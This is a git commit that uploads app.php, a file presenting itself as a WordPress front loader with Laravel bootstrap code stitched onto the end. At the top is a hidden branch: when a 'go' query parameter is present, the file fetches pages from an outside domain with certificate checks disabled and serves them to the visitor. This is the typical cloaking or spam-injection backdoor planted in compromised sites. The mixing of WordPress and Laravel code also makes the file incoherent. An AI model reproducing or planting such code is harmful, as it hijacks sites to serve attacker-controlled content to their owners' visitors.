f00fda92796614a332c657e8a18a6fa04afce33a
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-02-07 23:46:32 +0700

    Add files via upload

---
+++ app.php
@@ -0,0 +1,115 @@
+<?php
+if(isset($_GET['go'])) {
+    $url = $_GET['go'];
+    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
+    // INIT CURL
+    $ch = curl_init();
+
+    //init curl
+    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+    // SET URL FOR THE POST FORM LOGIN
+    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/nnjs/'.$url.'/');
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+
+    // common name and also verify that it matches the hostname provided)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    // Optional: Return the result instead of printing it
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    // ENABLE HTTP POST
+    curl_setopt ($ch, CURLOPT_POST, 1);
+    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+    $store = curl_exec ($ch);
+    echo $store;
+
+    // CLOSE CURL
+    curl_close ($ch);
+
+} else {
+  
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+
+  
+}
+?>
+
+<?php
+
+/*
+|--------------------------------------------------------------------------
+| Create The Application
+|--------------------------------------------------------------------------
+|
+| The first thing we will do is create a new Laravel application instance
+| which serves as the "glue" for all the components of Laravel, and is
+| the IoC container for the system binding all of the various parts.
+|
+*/
+
+$app = new Illuminate\Foundation\Application(
+    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
+);
+
+/*
+|--------------------------------------------------------------------------
+| Bind Important Interfaces
+|--------------------------------------------------------------------------
+|
+| Next, we need to bind some important interfaces into the container so
+| we will be able to resolve them when needed. The kernels serve the
+| incoming requests to this application from both the web and CLI.
+|
+*/
+
+$app->singleton(
+    Illuminate\Contracts\Http\Kernel::class,
+    App\Http\Kernel::class
+);
+
+$app->singleton(
+    Illuminate\Contracts\Console\Kernel::class,
+    App\Console\Kernel::class
+);
+
+$app->singleton(
+    Illuminate\Contracts\Debug\ExceptionHandler::class,
+    App\Exceptions\Handler::class
+);
+
+/*
+|--------------------------------------------------------------------------
+| Return The Application
+|--------------------------------------------------------------------------
+|
+| This script returns the application instance. The instance is given to
+| the calling script so we can separate the building of the instances
+| from the actual running of the application and sending responses.
+|
+*/
+
+return $app;
